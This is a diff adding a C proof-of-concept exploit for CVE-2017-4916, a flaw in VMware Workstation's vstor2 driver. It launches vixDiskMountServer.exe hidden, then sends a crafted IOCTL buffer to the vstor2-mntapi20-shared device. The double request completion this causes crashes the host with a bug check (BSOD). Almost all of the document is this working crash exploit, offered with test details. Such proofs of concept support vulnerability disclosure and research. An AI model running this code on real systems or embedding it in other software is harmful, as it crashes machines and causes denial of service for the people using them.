@@ -1,0 +1,42 @@
+/*
+ * Title: NULL pointer dereference vulnerability in vstor2 driver (VMware Workstation Pro/Player)
+ * CVE: 2017-4916 (VMSA-2017-0009)
+ * Author: Borja Merino (@BorjaMerino)
+ * Date: May 18, 2017
+ * Tested on: Windows 10 Pro and Windows 7 Pro (SP1) with VMware® Workstation 12 Pro (12.5.5 build-5234757)
+ * Affected: VMware Workstation Pro/Player 12.x
+ * Description: This p0c produces a BSOD by sending a specific IOCTL code to the vstor2_mntapi20_shared device
+ * driver due to a double call to IofCompleteRequest (generating a MULTIPLE_IRP_COMPLETE_REQUESTS bug check)
+*/
+
+#include "windows.h"
+#include "stdio.h"
+
+void ioctl_crash()
+{
+	HANDLE hfile;
+	WCHAR *vstore = L"\\\\.\\vstor2-mntapi20-shared";
+	DWORD dummy;
+	char reply[0x3FDC];
+	hfile = CreateFileW(vstore, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
+	char buf[384] = "\x80\x01\x00\x00\xc8\xdc\x00\x00\xba\xab";
+	DeviceIoControl(hfile, 0x2a002c, buf, 382, reply, sizeof(reply), &dummy, NULL);
+}
+
+void run_vix()
+{
+	STARTUPINFO si;
+	PROCESS_INFORMATION pi;
+	RtlZeroMemory(&si, sizeof(si));
+	RtlZeroMemory(&pi, sizeof(pi));
+	si.dwFlags |= STARTF_USESHOWWINDOW;
+	si.wShowWindow = SW_HIDE;
+    DWORD createFlags = CREATE_SUSPENDED;
+	CreateProcess(L"C:\\Program Files (x86)\\VMware\\VMware Workstation\\vixDiskMountServer.exe", NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+}
+
+void main()
+{
+	run_vix(); //Comment this if vixDiskMountServer.exe is already running
+	ioctl_crash();
+}
